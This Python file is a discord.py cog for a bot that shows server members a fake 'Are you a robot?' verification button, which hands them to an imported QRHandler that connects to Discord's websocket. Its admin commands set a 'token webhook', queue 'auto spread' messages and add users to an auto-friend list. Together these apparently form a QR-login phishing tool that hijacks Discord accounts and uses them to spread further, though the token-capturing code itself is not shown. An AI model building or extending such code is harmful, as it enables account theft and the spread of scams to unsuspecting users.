import discord
import asyncio
import os

from . QRHandler import QRHandler

from discord.ext import commands
import config
from colorama import init, Fore, Style

from discord.utils import get
from datetime import datetime
import json

class Delroledropdown(discord.ui.Select):
    def __init__(self):
        options = []
        for message in config.config['auto_spread']['messages']:
            option = discord.SelectOption(label=message)
            options.append(option)

        super().__init__(placeholder='Delete a message', min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        config.config['auto_spread']['messages'].remove(self.values[0])
        config.config.write()

        await interaction.message.delete()

class FriendReqdropdown(discord.ui.Select):
    def __init__(self):
        options = []
        for user in config.config['auto_add']['users']:
            option = discord.SelectOption(label=user)
            options.append(option)

        super().__init__(placeholder='Delete a friend request', min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        config.config['auto_add']['users'].remove(self.values[0])
        config.config.write()
        await interaction.message.delete()

class DropdownViewFriendReq(discord.ui.View):
    def __init__(self):
        super().__init__()

        # Adds the dropdown to our view object.
        self.add_item(FriendReqdropdown())

class DropdownViewDel(discord.ui.View):
    def __init__(self, guild):
        super().__init__()

        # Adds the dropdown to our view object.
        self.add_item(Delroledropdown())

class Dropdown(discord.ui.Select):
    def __init__(self, guild):
        self.guild = guild
        options = []
        for role in guild.roles:
            option = discord.SelectOption(label=role.name)
            options.append(option)

        super().__init__(placeholder='Choose your verify role', min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        role_id = get(self.guild.roles, name=self.values[0]).id

        config.config['servers'][str(self.guild.id)] = {'verify_role': role_id, 'auto_spread': True}

        config.config.write()
        
        await interaction.message.delete()

class DropdownView(discord.ui.View):
    def __init__(self, guild):
        super().__init__()

        # Adds the dropdown to our view object.
        self.add_item(Dropdown(guild))

class VerifyPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='🤖 Verify', style=discord.ButtonStyle.green, custom_id='persistent_view:green')
    async def green(self, interaction: discord.Interaction, button: discord.ui.Button):

        await interaction.response.defer(ephemeral=True, thinking=True)
        await QRHandler().run(interaction) #Connects to discord websocket then uses interaction variable to send reply

class VerificationCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self._last_member = None
        bot.add_view(VerifyPanel())


    @commands.command()
    @commands.has_permissions(administrator=True)
    async def setuppanel(self, ctx: commands.Context):
        
        embed = discord.Embed()
        embed.title = '🤖 Are you a robot? '
        embed.description = '✅ Click this button to get verified'
        embed.add_field(name='Why do I need to verify?', value='We require every user to verify to prevent raiding or malicious users.', inline=False)

        await ctx.send(embed=embed, view=VerifyPanel())
        await ctx.message.delete()

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def setuprole(self, ctx: commands.Context, arg1=None):
        global config

        if arg1 != None:
            config.config['servers'][str(ctx.guild.id)] = {'verify_role': arg1, 'auto_spread': True}
            config.config.write()
            return
        try:
            await ctx.send(view=DropdownView(ctx.guild))
        except:
            await ctx.send("Error: too many roles. Pass in role id as argument")
        await ctx.message.delete()

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def addmessage(self, ctx: commands.Context, arg1):
        config.config["auto_spread"]["messages"].append(arg1)
        config.config.write()
        await ctx.send("message added fam")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def deletemessage(self, ctx: commands.Context, arg1=None):
        if arg1:
            config.config['auto_spread']['messages'].remove(int(arg1))
            config.config.write()
        else:
            await ctx.send(view=DropdownViewDel(ctx.guild))

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def listmessages(self, ctx: commands.Context):
        await ctx.send('\n'.join(config.config['auto_spread']['messages']))

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def togglespreader(self, ctx: commands.Context):
        toggle = not config.config['servers'][str(ctx.guild.id)]['auto_spread']
        config.config['servers'][str(ctx.guild.id)]['auto_spread'] = toggle
        await config.config.write()
        await ctx.send(f'Changed auto spreader to: {str(toggle)}')

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def changetokenwebhook(self, ctx: commands.Context, arg1):
        config.config["webhook_url"] = arg1
        config.config.write()
        await ctx.send("webhook")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def addfriend(self, ctx: commands.Context, arg1):
        config.config["auto_add"]["users"].append(arg1)
        config.config.write()
        await ctx.send("user added fam")

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def giverole(self, ctx: commands.Context):
        role = get(ctx.guild.roles, id=config.config['servers'][str(ctx.guild.id)]['verify_role'])
        await ctx.author.add_roles(role)



    @commands.command()
    @commands.has_permissions(administrator=True)
    async def deletefriend(self, ctx: commands.Context):
        await ctx.send(view=DropdownViewFriendReq())

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def listfriends(self, ctx: commands.Context):
        await ctx.send('\n'.join(config.config['auto_add']['users']))


async def setup(bot):
    await bot.add_cog(VerificationCog(bot))